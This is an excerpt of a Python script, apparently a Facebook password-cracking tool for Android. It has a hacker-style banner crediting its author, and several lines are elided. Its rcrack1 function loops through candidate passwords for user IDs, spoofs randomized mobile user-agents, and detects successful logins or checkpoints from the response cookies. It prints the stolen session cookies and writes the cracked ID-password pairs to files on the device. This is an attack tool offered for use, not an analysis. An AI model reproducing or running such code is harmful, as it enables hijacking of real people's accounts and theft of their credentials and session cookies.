...
\033[1;97m══════════════════════════════════════════
 \033[1;37m[+] AUTHOR    :\033[1;37m PRINCE--NIROB
 \033[1;37m[+] GITHUB    :\033[1;37m PRINCE--NIROB
 \033[1;37m[+] FACEBOOK  :\033[1;37m princenirob.111
 \033[1;37m[+] TOOLS     :\033[1;37m FREE+TEST
\033[1;97m══════════════════════════════════════════""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mMr.X\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
          ...
          "user-agent": f'Mozilla/5.0 ({random.choice(platforms)} {random.randint(1,20)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(1,20)) + "." + str(random.randint(0,10))} Mobile Safari/537.36' }
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Mr.X-OK] {uid} | {ps}")
                print(f"\n\033[1;92m[COOKIE] : {coki}")
                open('/sdcard/Mr.X/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Mr.X-CP] {uid} | {ps}")
                open('/sdcard/Mr.X-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
